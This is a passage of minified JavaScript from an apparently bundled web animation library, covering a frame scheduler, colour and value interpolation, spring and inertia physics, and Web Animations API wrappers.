o=n;n=r,r=o,n.forEach(l),t&&Fr.value&&Fr.value.frameloop[t].push(c),c=0,n.clear(),i=!1,a&&(a=!1,u.process(e))}};return u}var Lr=40;function Rr(e,t){let n=!1,r=!0,i={delta:0,timestamp:0,isProcessing:!1},a=()=>n=!0,o=Pr.reduce((e,n)=>(e[n]=Ir(a,t?n:void 0),e),{}),{setup:s,read:c,resolveKeyframes:l,preUpdate:u,update:d,preRender:f,render:p,postRender:m}=o,h=()=>{let a=$n.useManualTiming,o=a?i.timestamp:performance.now();n=!1,a||(i.delta=r?1e3/60:Math.max(Math.min(o-i.timestamp,Lr),1)),i.timestamp=o,i.isProcessing=!0,s.process(i),c.process(i),l.process(i),u.process(i),d.process(i),f.process(i),p.process(i),m.process(i),i.isProcessing=!1,n&&t&&(r=!1,e(h))},g=()=>{n=!0,r=!0,i.isProcessing||e(h)};return{schedule:Pr.reduce((e,t)=>{let r=o[t];return e[t]=(e,t=!1,i=!1)=>(n||g(),r.schedule(e,t,i)),e},{}),cancel:e=>{for(let t=0;t<Pr.length;t++)o[Pr[t]].cancel(e)},state:i,steps:o}}var{schedule:j,cancel:zr,state:Br,steps:Vr}=Rr(typeof requestAnimationFrame<`u`?requestAnimationFrame:ir,!0),Hr;function Ur(){Hr=void 0}var Wr={now:()=>(Hr===void 0&&Wr.set(Br.isProcessing||$n.useManualTiming?Br.timestamp:performance.now()),Hr),set:e=>{Hr=e,queueMicrotask(Ur)}},Gr={layout:0,mainThread:0,waapi:0},Kr=e=>t=>typeof t==`string`&&t.startsWith(e),qr=Kr(`--`),Jr=Kr(`var(--`),Yr=e=>Jr(e)?Xr.test(e.split(`/*`)[0].trim()):!1,Xr=/var\(--(?:[\w-]+\s*|[\w-]+\s*,(?:\s*[^)(\s]|\s*\((?:[^)(]|\([^)(]*\))*\))+\s*)\)$/iu;function Zr(e){return typeof e==`string`?e.split(`/*`)[0].includes(`var(--`):!1}var Qr={test:e=>typeof e==`number`,parse:parseFloat,transform:e=>e},$r={...Qr,transform:e=>Qn(0,1,e)},ei={...Qr,default:1},ti=e=>Math.round(e*1e5)/1e5,ni=/-?(?:\d+(?:\.\d+)?|\.\d+)/gu;function ri(e){return e==null}var ii=/^(?:#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\))$/iu,ai=(e,t)=>n=>!!(typeof n==`string`&&ii.test(n)&&n.startsWith(e)||t&&!ri(n)&&Object.prototype.hasOwnProperty.call(n,t)),oi=(e,t,n)=>r=>{if(typeof r!=`string`)return r;let[i,a,o,s]=r.match(ni);return{[e]:parseFloat(i),[t]:parseFloat(a),[n]:parseFloat(o),alpha:s===void 0?1:parseFloat(s)}},si=e=>Qn(0,255,e),ci={...Qr,transform:e=>Math.round(si(e))},li={test:ai(`rgb`,`red`),parse:oi(`red`,`green`,`blue`),transform:({red:e,green:t,blue:n,alpha:r=1})=>`rgba(`+ci.transform(e)+`, `+ci.transform(t)+`, `+ci.transform(n)+`, `+ti($r.transform(r))+`)`};function ui(e){let t=``,n=``,r=``,i=``;return e.length>5?(t=e.substring(1,3),n=e.substring(3,5),r=e.substring(5,7),i=e.substring(7,9)):(t=e.substring(1,2),n=e.substring(2,3),r=e.substring(3,4),i=e.substring(4,5),t+=t,n+=n,r+=r,i+=i),{red:parseInt(t,16),green:parseInt(n,16),blue:parseInt(r,16),alpha:i?parseInt(i,16)/255:1}}var di={test:ai(`#`),parse:ui,transform:li.transform},fi=e=>({test:t=>typeof t==`string`&&t.endsWith(e)&&t.split(` `).length===1,parse:parseFloat,transform:t=>`${t}${e}`}),pi=fi(`deg`),mi=fi(`%`),M=fi(`px`),hi=fi(`vh`),gi=fi(`vw`),_i={...mi,parse:e=>mi.parse(e)/100,transform:e=>mi.transform(e*100)},vi={test:ai(`hsl`,`hue`),parse:oi(`hue`,`saturation`,`lightness`),transform:({hue:e,saturation:t,lightness:n,alpha:r=1})=>`hsla(`+Math.round(e)+`, `+mi.transform(ti(t))+`, `+mi.transform(ti(n))+`, `+ti($r.transform(r))+`)`},yi={test:e=>li.test(e)||di.test(e)||vi.test(e),parse:e=>li.test(e)?li.parse(e):vi.test(e)?vi.parse(e):di.parse(e),transform:e=>typeof e==`string`?e:e.hasOwnProperty(`red`)?li.transform(e):vi.transform(e),getAnimatableNone:e=>{let t=yi.parse(e);return t.alpha=0,yi.transform(t)}},bi=/(?:#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\))/giu;function xi(e){return isNaN(e)&&typeof e==`string`&&(e.match(ni)?.length||0)+(e.match(bi)?.length||0)>0}var Si=`number`,Ci=`color`,wi=`var`,Ti=`var(`,Ei="${}",Di=/var\s*\(\s*--(?:[\w-]+\s*|[\w-]+\s*,(?:\s*[^)(\s]|\s*\((?:[^)(]|\([^)(]*\))*\))+\s*)\)|#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\)|-?(?:\d+(?:\.\d+)?|\.\d+)/giu;function Oi(e){let t=e.toString(),n=[],r={color:[],number:[],var:[]},i=[],a=0;return{values:n,split:t.replace(Di,e=>(yi.test(e)?(r.color.push(a),i.push(Ci),n.push(yi.parse(e))):e.startsWith(Ti)?(r.var.push(a),i.push(wi),n.push(e)):(r.number.push(a),i.push(Si),n.push(parseFloat(e))),++a,Ei)).split(Ei),indexes:r,types:i}}function ki(e){return Oi(e).values}function Ai({split:e,types:t}){let n=e.length;return r=>{let i=``;for(let a=0;a<n;a++)if(i+=e[a],r[a]!==void 0){let e=t[a];e===Si?i+=ti(r[a]):e===Ci?i+=yi.transform(r[a]):i+=r[a]}return i}}function ji(e){return Ai(Oi(e))}var Mi=e=>typeof e==`number`?0:yi.test(e)?yi.getAnimatableNone(e):e,Ni=(e,t)=>typeof e==`number`?t?.trim().endsWith(`/`)?e:0:Mi(e);function Pi(e){let t=Oi(e);return Ai(t)(t.values.map((e,n)=>Ni(e,t.split[n])))}var Fi={test:xi,parse:ki,createTransformer:ji,getAnimatableNone:Pi};function Ii(e,t,n){return n<0&&(n+=1),n>1&&--n,n<1/6?e+(t-e)*6*n:n<1/2?t:n<2/3?e+(t-e)*(2/3-n)*6:e}function Li({hue:e,saturation:t,lightness:n,alpha:r}){e/=360,t/=100,n/=100;let i=0,a=0,o=0;if(!t)i=a=o=n;else{let r=n<.5?n*(1+t):n+t-n*t,s=2*n-r;i=Ii(s,r,e+1/3),a=Ii(s,r,e),o=Ii(s,r,e-1/3)}return{red:Math.round(i*255),green:Math.round(a*255),blue:Math.round(o*255),alpha:r}}function Ri(e,t){return n=>n>0?t:e}var N=(e,t,n)=>e+(t-e)*n,P=(e,t,n)=>{let r=e*e,i=n*(t*t-r)+r;return i<0?0:Math.sqrt(i)},F=[di,li,vi],zi=e=>F.find(t=>t.test(e));function Bi(e){let t=zi(e);if(`${e}`,!t)return!1;let n=t.parse(e);return t===vi&&(n=Li(n)),n}var Vi=(e,t)=>{let n=Bi(e),r=Bi(t);if(!n||!r)return Ri(e,t);let i={...n};return e=>(i.red=P(n.red,r.red,e),i.green=P(n.green,r.green,e),i.blue=P(n.blue,r.blue,e),i.alpha=N(n.alpha,r.alpha,e),li.transform(i))},Hi=new Set([`none`,`hidden`]);function Ui(e,t){return Hi.has(e)?n=>n<=0?e:t:n=>n>=1?t:e}function Wi(e,t){return n=>N(e,t,n)}function Gi(e){return typeof e==`number`?Wi:typeof e==`string`?Yr(e)?Ri:yi.test(e)?Vi:Yi:Array.isArray(e)?Ki:typeof e==`object`?yi.test(e)?Vi:qi:Ri}function Ki(e,t){let n=[...e],r=n.length,i=e.map((e,n)=>Gi(e)(e,t[n]));return e=>{for(let t=0;t<r;t++)n[t]=i[t](e);return n}}function qi(e,t){let n={...e,...t},r={};for(let i in n)e[i]!==void 0&&t[i]!==void 0&&(r[i]=Gi(e[i])(e[i],t[i]));return e=>{for(let t in r)n[t]=r[t](e);return n}}function Ji(e,t){let n=[],r={color:0,var:0,number:0};for(let i=0;i<t.values.length;i++){let a=t.types[i],o=e.indexes[a][r[a]];n[i]=e.values[o]??0,r[a]++}return n}var Yi=(e,t)=>{let n=Fi.createTransformer(t),r=Oi(e),i=Oi(t);return r.indexes.var.length===i.indexes.var.length&&r.indexes.color.length===i.indexes.color.length&&r.indexes.number.length>=i.indexes.number.length?Hi.has(e)&&!i.values.length||Hi.has(t)&&!r.values.length?Ui(e,t):or(Ki(Ji(r,i),i.values),n):(`${e}${t}`,Ri(e,t))};function Xi(e,t,n){return typeof e==`number`&&typeof t==`number`&&typeof n==`number`?N(e,t,n):Gi(e)(e,t)}var Zi=e=>{let t=({timestamp:t})=>e(t);return{start:(e=!0)=>j.update(t,e),stop:()=>zr(t),now:()=>Br.isProcessing?Br.timestamp:Wr.now()}},Qi=(e,t,n=10)=>{let r=``,i=Math.max(Math.round(t/n),2);for(let t=0;t<i;t++)r+=Math.round(e(t/(i-1))*1e4)/1e4+`, `;return`linear(${r.substring(0,r.length-2)})`},$i=2e4;function ea(e){let t=0,n=e.next(t);for(;!n.done&&t<2e4;)t+=50,n=e.next(t);return t>=2e4?1/0:t}function ta(e,t=100,n){let r=n({...e,keyframes:[0,t]}),i=Math.min(ea(r),$i);return{type:`keyframes`,ease:e=>r.next(i*e).value/t,duration:ur(i)}}var I={stiffness:100,damping:10,mass:1,velocity:0,duration:800,bounce:.3,visualDuration:.3,restSpeed:{granular:.01,default:2},restDelta:{granular:.005,default:.5},minDuration:.01,maxDuration:10,minDamping:.05,maxDamping:1};function na(e,t){return e*Math.sqrt(1-t*t)}var ra=12;function ia(e,t,n){let r=n;for(let n=1;n<ra;n++)r-=e(r)/t(r);return r}var aa=.001;function oa({duration:e=I.duration,bounce:t=I.bounce,velocity:n=I.velocity,mass:r=I.mass}){let i,a;lr(I.maxDuration);let o=1-t;o=Qn(I.minDamping,I.maxDamping,o),e=Qn(I.minDuration,I.maxDuration,ur(e)),o<1?(i=t=>{let r=t*o,i=r*e,a=r-n,s=na(t,o),c=Math.exp(-i);return aa-a/s*c},a=t=>{let r=t*o*e,a=r*n+n,s=o**2*t**2*e,c=Math.exp(-r),l=na(t**2,o);return(-i(t)+aa>0?-1:1)*((a-s)*c)/l}):(i=t=>{let r=Math.exp(-t*e),i=(t-n)*e+1;return-aa+r*i},a=t=>Math.exp(-t*e)*((n-t)*(e*e)));let s=5/e,c=ia(i,a,s);if(e=lr(e),isNaN(c))return{stiffness:I.stiffness,damping:I.damping,duration:e};{let t=c**2*r;return{stiffness:t,damping:o*2*Math.sqrt(r*t),duration:e}}}var sa=[`duration`,`bounce`],ca=[`stiffness`,`damping`,`mass`];function la(e,t){return t.some(t=>e[t]!==void 0)}function ua(e){let t={velocity:I.velocity,stiffness:I.stiffness,damping:I.damping,mass:I.mass,isResolvedFromDuration:!1,...e};if(!la(e,ca)&&la(e,sa))if(t.velocity=0,e.visualDuration){let n=e.visualDuration,r=2*Math.PI/(n*1.2),i=r*r,a=2*Qn(.05,1,1-(e.bounce||0))*Math.sqrt(i);t={...t,mass:I.mass,stiffness:i,damping:a}}else{let n=oa({...e,velocity:0});t={...t,...n,mass:I.mass},t.isResolvedFromDuration=!0}return t}function da(e=I.visualDuration,t=I.bounce){let n=typeof e==`object`?e:{visualDuration:e,keyframes:[0,1],bounce:t},{restSpeed:r,restDelta:i}=n,a=n.keyframes[0],o=n.keyframes[n.keyframes.length-1],s={done:!1,value:a},{stiffness:c,damping:l,mass:u,duration:d,velocity:f,isResolvedFromDuration:p}=ua({...n,velocity:-ur(n.velocity||0)}),m=f||0,h=l/(2*Math.sqrt(c*u)),g=o-a,_=ur(Math.sqrt(c/u)),v=Math.abs(g)<5;r||=v?I.restSpeed.granular:I.restSpeed.default,i||=v?I.restDelta.granular:I.restDelta.default;let y,b,x,S,C,w;if(h<1)x=na(_,h),S=(m+h*_*g)/x,y=e=>o-Math.exp(-h*_*e)*(S*Math.sin(x*e)+g*Math.cos(x*e)),C=h*_*S+g*x,w=h*_*g-S*x,b=e=>Math.exp(-h*_*e)*(C*Math.sin(x*e)+w*Math.cos(x*e));else if(h===1){y=e=>o-Math.exp(-_*e)*(g+(m+_*g)*e);let e=m+_*g;b=t=>Math.exp(-_*t)*(_*e*t-m)}else{let e=_*Math.sqrt(h*h-1);y=t=>{let n=Math.exp(-h*_*t),r=Math.min(e*t,300);return o-n*((m+h*_*g)*Math.sinh(r)+e*g*Math.cosh(r))/e};let t=(m+h*_*g)/e,n=h*_*t-g*e,r=h*_*g-t*e;b=t=>{let i=Math.exp(-h*_*t),a=Math.min(e*t,300);return i*(n*Math.sinh(a)+r*Math.cosh(a))}}let T={calculatedDuration:p&&d||null,velocity:e=>lr(b(e)),next:e=>{if(!p&&h<1){let t=Math.exp(-h*_*e),n=Math.sin(x*e),a=Math.cos(x*e),c=o-t*(S*n+g*a),l=lr(t*(C*n+w*a));return s.done=Math.abs(l)<=r&&Math.abs(o-c)<=i,s.value=s.done?o:c,s}let t=y(e);if(p)s.done=e>=d;else{let n=lr(b(e));s.done=Math.abs(n)<=r&&Math.abs(o-t)<=i}return s.value=s.done?o:t,s},toString:()=>{let e=Math.min(ea(T),$i),t=Qi(t=>T.next(e*t).value,e,30);return e+`ms `+t},toTransition:()=>{}};return T}da.applyToOptions=e=>{let t=ta(e,100,da);return e.ease=t.ease,e.duration=lr(t.duration),e.type=`keyframes`,e};var fa=5;function pa(e,t,n){let r=Math.max(t-fa,0);return dr(n-e(r),t-r)}function ma({keyframes:e,velocity:t=0,power:n=.8,timeConstant:r=325,bounceDamping:i=10,bounceStiffness:a=500,modifyTarget:o,min:s,max:c,restDelta:l=.5,restSpeed:u}){let d=e[0],f={done:!1,value:d},p=e=>s!==void 0&&e<s||c!==void 0&&e>c,m=e=>s===void 0?c:c===void 0||Math.abs(s-e)<Math.abs(c-e)?s:c,h=n*t,g=d+h,_=o===void 0?g:o(g);_!==g&&(h=_-d);let v=e=>-h*Math.exp(-e/r),y=e=>_+v(e),b=e=>{let t=v(e),n=y(e);f.done=Math.abs(t)<=l,f.value=f.done?_:n},x,S,C=e=>{p(f.value)&&(x=e,S=da({keyframes:[f.value,m(f.value)],velocity:pa(y,e,f.value),damping:i,stiffness:a,restDelta:l,restSpeed:u}))};return C(0),{calculatedDuration:null,next:e=>{let t=!1;return!S&&x===void 0&&(t=!0,b(e),C(e)),x!==void 0&&e>=x?S.next(e-x):(!t&&b(e),f)}}}function ha(e,t,n){let r=[],i=n||$n.mix||Xi,a=e.length-1;for(let n=0;n<a;n++){let a=i(e[n],e[n+1]);t&&(a=or(Array.isArray(t)?t[n]||ir:t,a)),r.push(a)}return r}function ga(e,t,{clamp:n=!0,ease:r,mixer:i}={}){let a=e.length;if(t.length,a===1)return()=>t[0];if(a===2&&t[0]===t[1])return()=>t[1];let o=e[0]===e[1];e[0]>e[a-1]&&(e=[...e].reverse(),t=[...t].reverse());let s=ha(t,r,i),c=s.length,l=n=>{if(o&&n<e[0])return t[0];let r=0;if(c>1)for(;r<e.length-2&&!(n<e[r+1]);r++);let i=sr(e[r],e[r+1],n);return s[r](i)};return n?t=>l(Qn(e[0],e[a-1],t)):l}function _a(e,t){let n=e[e.length-1];for(let r=1;r<=t;r++){let i=sr(0,t,r);e.push(N(n,1,i))}}function va(e){let t=[0];return _a(t,e.length-1),t}function ya(e,t){return e.map(e=>e*t)}function ba(e,t){return e.map(()=>t||Or).splice(0,e.length-1)}function xa({duration:e=300,keyframes:t,times:n,ease:r=`easeInOut`}){let i=kr(r)?r.map(Nr):Nr(r),a={done:!1,value:t[0]},o=ga(ya(n&&n.length===t.length?n:va(t),e),t,{ease:Array.isArray(i)?i:ba(t,i)});return{calculatedDuration:e,next:t=>(a.value=o(t),a.done=t>=e,a)}}var Sa=e=>e!==null;function Ca(e,{repeat:t,repeatType:n=`loop`},r,i=1){let a=e.filter(Sa),o=i<0||t&&n!==`loop`&&t%2==1?0:a.length-1;return!o||r===void 0?a[o]:r}var wa={decay:ma,inertia:ma,tween:xa,keyframes:xa,spring:da};function Ta(e){typeof e.type==`string`&&(e.type=wa[e.type])}var Ea=class{constructor(){this.updateFinished()}get finished(){return this._finished}updateFinished(){this._finished=new Promise(e=>{this.resolve=e})}notifyFinished(){this.resolve()}then(e,t){return this.finished.then(e,t)}},Da=e=>e/100,Oa=class extends Ea{constructor(e){super(),this.state=`idle`,this.startTime=null,this.isStopped=!1,this.currentTime=0,this.holdTime=null,this.playbackSpeed=1,this.stop=()=>{let{motionValue:e}=this.options;e&&e.updatedAt!==Wr.now()&&this.tick(Wr.now()),this.isStopped=!0,this.state!==`idle`&&(this.teardown(),this.options.onStop?.())},Gr.mainThread++,this.options=e,this.initAnimation(),this.play(),e.autoplay===!1&&this.pause()}initAnimation(){let{options:e}=this;Ta(e);let{type:t=xa,repeat:n=0,repeatDelay:r=0,repeatType:i,velocity:a=0}=e,{keyframes:o}=e,s=t||xa;s!==xa&&typeof o[0]!=`number`&&(this.mixKeyframes=or(Da,Xi(o[0],o[1])),o=[0,100]);let c=s({...e,keyframes:o});i===`mirror`&&(this.mirroredGenerator=s({...e,keyframes:[...o].reverse(),velocity:-a})),c.calculatedDuration===null&&(c.calculatedDuration=ea(c));let{calculatedDuration:l}=c;this.calculatedDuration=l,this.resolvedDuration=l+r,this.totalDuration=this.resolvedDuration*(n+1)-r,this.generator=c}updateTime(e){let t=Math.round(e-this.startTime)*this.playbackSpeed;this.holdTime===null?this.currentTime=t:this.currentTime=this.holdTime}tick(e,t=!1){let{generator:n,totalDuration:r,mixKeyframes:i,mirroredGenerator:a,resolvedDuration:o,calculatedDuration:s}=this;if(this.startTime===null)return n.next(0);let{delay:c=0,keyframes:l,repeat:u,repeatType:d,repeatDelay:f,type:p,onUpdate:m,finalKeyframe:h}=this.options;this.speed>0?this.startTime=Math.min(this.startTime,e):this.speed<0&&(this.startTime=Math.min(e-r/this.speed,this.startTime)),t?this.currentTime=e:this.updateTime(e);let g=this.currentTime-c*(this.playbackSpeed>=0?1:-1),_=this.playbackSpeed>=0?g<0:g>r;this.currentTime=Math.max(g,0),this.state===`finished`&&this.holdTime===null&&(this.currentTime=r);let v=this.currentTime,y=n;if(u){let e=Math.min(this.currentTime,r)/o,t=Math.floor(e),n=e%1;!n&&e>=1&&(n=1),n===1&&t--,t=Math.min(t,u+1),t%2&&(d===`reverse`?(n=1-n,f&&(n-=f/o)):d===`mirror`&&(y=a)),v=Qn(0,1,n)*o}let b=_?{done:!1,value:l[0]}:y.next(v);i&&!_&&(b.value=i(b.value));let{done:x}=b;!_&&s!==null&&(x=this.playbackSpeed>=0?this.currentTime>=r:this.currentTime<=0);let S=this.holdTime===null&&(this.state===`finished`||this.state===`running`&&x);return S&&p!==ma&&(b.value=Ca(l,this.options,h,this.speed)),m&&m(b.value),S&&this.finish(),b}then(e,t){return this.finished.then(e,t)}get duration(){return ur(this.calculatedDuration)}get iterationDuration(){let{delay:e=0}=this.options||{};return this.duration+ur(e)}get time(){return ur(this.currentTime)}set time(e){e=lr(e),this.currentTime=e,this.startTime===null||this.holdTime!==null||this.playbackSpeed===0?this.holdTime=e:this.driver&&(this.startTime=this.driver.now()-e/this.playbackSpeed),this.driver?this.driver.start(!1):(this.startTime=0,this.state=`paused`,this.holdTime=e,this.tick(e))}getGeneratorVelocity(){let e=this.currentTime;if(e<=0)return this.options.velocity||0;if(this.generator.velocity)return this.generator.velocity(e);let t=this.generator.next(e).value;return pa(e=>this.generator.next(e).value,e,t)}get speed(){return this.playbackSpeed}set speed(e){let t=this.playbackSpeed!==e;t&&this.driver&&this.updateTime(Wr.now()),this.playbackSpeed=e,t&&this.driver&&(this.time=ur(this.currentTime))}play(){if(this.isStopped)return;let{driver:e=Zi,startTime:t}=this.options;this.driver||=e(e=>this.tick(e)),this.options.onPlay?.();let n=this.driver.now();this.state===`finished`?(this.updateFinished(),this.startTime=n):this.holdTime===null?this.startTime||=t??n:this.startTime=n-this.holdTime,this.state===`finished`&&this.speed<0&&(this.startTime+=this.calculatedDuration),this.holdTime=null,this.state=`running`,this.driver.start()}pause(){this.state=`paused`,this.updateTime(Wr.now()),this.holdTime=this.currentTime}complete(){this.state!==`running`&&this.play(),this.state=`finished`,this.holdTime=null}finish(){this.notifyFinished(),this.teardown(),this.state=`finished`,this.options.onComplete?.()}cancel(){this.holdTime=null,this.startTime=0,this.tick(0),this.teardown(),this.options.onCancel?.()}teardown(){this.state=`idle`,this.stopDriver(),this.startTime=this.holdTime=null,Gr.mainThread--}stopDriver(){this.driver&&=(this.driver.stop(),void 0)}sample(e){return this.startTime=0,this.tick(e,!0)}attachTimeline(e){return this.options.allowFlatten&&(this.options.type=`keyframes`,this.options.ease=`linear`,this.initAnimation()),this.driver?.stop(),e.observe(this)}};function ka(e){for(let t=1;t<e.length;t++)e[t]??(e[t]=e[t-1])}var Aa=e=>e*180/Math.PI,ja=e=>Na(Aa(Math.atan2(e[1],e[0]))),Ma={x:4,y:5,translateX:4,translateY:5,scaleX:0,scaleY:3,scale:e=>(Math.abs(e[0])+Math.abs(e[3]))/2,rotate:ja,rotateZ:ja,skewX:e=>Aa(Math.atan(e[1])),skewY:e=>Aa(Math.atan(e[2])),skew:e=>(Math.abs(e[1])+Math.abs(e[2]))/2},Na=e=>(e%=360,e<0&&(e+=360),e),Pa=ja,Fa=e=>Math.sqrt(e[0]*e[0]+e[1]*e[1]),Ia=e=>Math.sqrt(e[4]*e[4]+e[5]*e[5]),La={x:12,y:13,z:14,translateX:12,translateY:13,translateZ:14,scaleX:Fa,scaleY:Ia,scale:e=>(Fa(e)+Ia(e))/2,rotateX:e=>Na(Aa(Math.atan2(e[6],e[5]))),rotateY:e=>Na(Aa(Math.atan2(-e[2],e[0]))),rotateZ:Pa,rotate:Pa,skewX:e=>Aa(Math.atan(e[4])),skewY:e=>Aa(Math.atan(e[1])),skew:e=>(Math.abs(e[1])+Math.abs(e[4]))/2};function Ra(e){return e.includes(`scale`)?1:0}function za(e,t){if(!e||e===`none`)return Ra(t);let n=e.match(/^matrix3d\(([-\d.e\s,]+)\)$/u),r,i;if(n)r=La,i=n;else{let t=e.match(/^matrix\(([-\d.e\s,]+)\)$/u);r=Ma,i=t}if(!i)return Ra(t);let a=r[t],o=i[1].split(`,`).map(Va);return typeof a==`function`?a(o):o[a]}var Ba=(e,t)=>{let{transform:n=`none`}=getComputedStyle(e);return za(n,t)};function Va(e){return parseFloat(e.trim())}var Ha=[`transformPerspective`,`x`,`y`,`z`,`translateX`,`translateY`,`translateZ`,`scale`,`scaleX`,`scaleY`,`rotate`,`rotateX`,`rotateY`,`rotateZ`,`skew`,`skewX`,`skewY`],Ua=new Set(Ha),Wa=e=>e===Qr||e===M,Ga=new Set([`x`,`y`,`z`]),Ka=Ha.filter(e=>!Ga.has(e));function qa(e){let t=[];return Ka.forEach(n=>{let r=e.getValue(n);r!==void 0&&(t.push([n,r.get()]),r.set(n.startsWith(`scale`)?1:0))}),t}var Ja={width:({x:e},{paddingLeft:t=`0`,paddingRight:n=`0`,boxSizing:r})=>{let i=e.max-e.min;return r===`border-box`?i:i-parseFloat(t)-parseFloat(n)},height:({y:e},{paddingTop:t=`0`,paddingBottom:n=`0`,boxSizing:r})=>{let i=e.max-e.min;return r===`border-box`?i:i-parseFloat(t)-parseFloat(n)},top:(e,{top:t})=>parseFloat(t),left:(e,{left:t})=>parseFloat(t),bottom:({y:e},{top:t})=>parseFloat(t)+(e.max-e.min),right:({x:e},{left:t})=>parseFloat(t)+(e.max-e.min),x:(e,{transform:t})=>za(t,`x`),y:(e,{transform:t})=>za(t,`y`)};Ja.translateX=Ja.x,Ja.translateY=Ja.y;var Ya=new Set,Xa=!1,Za=!1,Qa=!1;function $a(){if(Za){let e=Array.from(Ya).filter(e=>e.needsMeasurement),t=new Set(e.map(e=>e.element)),n=new Map;t.forEach(e=>{let t=qa(e);t.length&&(n.set(e,t),e.render())}),e.forEach(e=>e.measureInitialState()),t.forEach(e=>{e.render();let t=n.get(e);t&&t.forEach(([t,n])=>{e.getValue(t)?.set(n)})}),e.forEach(e=>e.measureEndState()),e.forEach(e=>{e.suspendedScrollY!==void 0&&window.scrollTo(0,e.suspendedScrollY)})}Za=!1,Xa=!1,Ya.forEach(e=>e.complete(Qa)),Ya.clear()}function eo(){Ya.forEach(e=>{e.readKeyframes(),e.needsMeasurement&&(Za=!0)})}function to(){Qa=!0,eo(),$a(),Qa=!1}var no=class{constructor(e,t,n,r,i,a=!1){this.state=`pending`,this.isAsync=!1,this.needsMeasurement=!1,this.unresolvedKeyframes=[...e],this.onComplete=t,this.name=n,this.motionValue=r,this.element=i,this.isAsync=a}scheduleResolve(){this.state=`scheduled`,this.isAsync?(Ya.add(this),Xa||(Xa=!0,j.read(eo),j.resolveKeyframes($a))):(this.readKeyframes(),this.complete())}readKeyframes(){let{unresolvedKeyframes:e,name:t,element:n,motionValue:r}=this;if(e[0]===null){let i=r?.get(),a=e[e.length-1];if(i!==void 0)e[0]=i;else if(n&&t){let r=n.readValue(t,a);r!=null&&(e[0]=r)}e[0]===void 0&&(e[0]=a),r&&i===void 0&&r.set(e[0])}ka(e)}setFinalKeyframe(){}measureInitialState(){}renderEndStyles(){}measureEndState(){}complete(e=!1){this.state=`complete`,this.onComplete(this.unresolvedKeyframes,this.finalKeyframe,e),Ya.delete(this)}cancel(){this.state===`scheduled`&&(Ya.delete(this),this.state=`pending`)}resume(){this.state===`pending`&&this.scheduleResolve()}},ro=e=>e.startsWith(`--`);function io(e,t,n){ro(t)?e.style.setProperty(t,n):e.style[t]=n}var ao={};function oo(e,t){let n=rr(e);return()=>ao[t]??n()}var so=oo(()=>window.ScrollTimeline!==void 0,`scrollTimeline`),co=oo(()=>{try{document.createElement(`div`).animate({opacity:0},{easing:`linear(0, 1)`})}catch{return!1}return!0},`linearEasing`),lo=([e,t,n,r])=>`cubic-bezier(${e}, ${t}, ${n}, ${r})`,uo={linear:`linear`,ease:`ease`,easeIn:`ease-in`,easeOut:`ease-out`,easeInOut:`ease-in-out`,circIn:lo([0,.65,.55,1]),circOut:lo([.55,0,1,.45]),backIn:lo([.31,.01,.66,-.59]),backOut:lo([.33,1.53,.69,.99])};function fo(e,t){if(e)return typeof e==`function`?co()?Qi(e,t):`ease-out`:Ar(e)?lo(e):Array.isArray(e)?e.map(e=>fo(e,t)||uo.easeOut):uo[e]}function po(e,t,n,{delay:r=0,duration:i=300,repeat:a=0,repeatType:o=`loop`,ease:s=`easeOut`,times:c}={},l=void 0){let u={[t]:n};c&&(u.offset=c);let d=fo(s,i);Array.isArray(d)&&(u.easing=d),Fr.value&&Gr.waapi++;let f={delay:r,duration:i,easing:Array.isArray(d)?`linear`:d,fill:`both`,iterations:a+1,direction:o===`reverse`?`alternate`:`normal`};l&&(f.pseudoElement=l);let p=e.animate(u,f);return Fr.value&&p.finished.finally(()=>{Gr.waapi--}),p}function mo(e){return typeof e==`function`&&`applyToOptions`in e}function ho({type:e,...t}){return mo(e)&&co()?e.applyToOptions(t):(t.duration??=300,t.ease??=`easeOut`,t)}var go=class extends Ea{constructor(e){if(super(),this.finishedTime=null,this.isStopped=!1,this.manualStartTime=null,!e)return;let{element:t,name:n,keyframes:r,pseudoElement:i,allowFlatten:a=!1,finalKeyframe:o,onComplete:s}=e;this.isPseudoElement=!!i,this.allowFlatten=a,this.options=e,e.type;let c=ho(e);this.animation=po(t,n,r,c,i),c.autoplay===!1&&this.animation.pause(),this.animation.onfinish=()=>{if(this.finishedTime=this.time,!i){let e=Ca(r,this.options,o,this.speed);this.updateMotionValue&&this.updateMotionValue(e),io(t,n,e),this.animation.cancel()}s?.(),this.notifyFinished()}}play(){this.isStopped||(this.manualStartTime=null,this.animation.play(),this.state===`finished`&&this.updateFinished())}pause(){this.animation.pause()}complete(){this.animation.finish?.()}cancel(){try{this.animation.cancel()}catch{}}stop(){if(this.isStopped)return;this.isStopped=!0;let{state:e}=this;e===`idle`||e===`finished`||(this.updateMotionValue?this.updateMotionValue():this.commitStyles(),this.isPseudoElement||this.cancel())}commitStyles(){let e=this.options?.element;!this.isPseudoElement&&e?.isConnected&&this.animation.commitStyles?.()}get duration(){let e=this.animation.effect?.getComputedTiming?.().duration||0;return ur(Number(e))}get iterationDuration(){let{delay:e=0}=this.options||{};return this.duration+ur(e)}get time(){return ur(Number(this.animation.currentTime)||0)}set time(e){let t=this.finishedTime!==null;this.manualStartTime=null,this.finishedTime=null,this.animation.currentTime=lr(e),t&&this.animation.pause()}get speed(){return this.animation.playbackRate}set speed(e){e<0&&(this.finishedTime=null),this.animation.playbackRate=e}get state(){return this.finishedTime===null?this.animation.playState:`finished`}get startTime(){return this.manualStartTime??Number(this.animation.startTime)}set startTime(e){this.manualStartTime=this.animation.startTime=e}attachTimeline({timeline:e,rangeStart:t,rangeEnd:n,observe:r}){return this.allowFlatten&&this.animation.effect?.updateTiming({easing:`linear`}),this.animation.onfinish=null,e&&so()?(this.animation.timeline=e,t&&(this.animation.rangeStart=t),n&&(this.animation.rangeEnd=n),ir):r(this)}},L={anticipate:Sr,backInOut:xr,circInOut:Tr};function R(e){return e in L}function _o(e){typeof e.ease==`string`&&R(e.ease)&&(e.ease=L[e.ease])}var vo=10,yo=class extends go{constructor(e){_o(e),Ta(e),super(e),e.startTime!==void 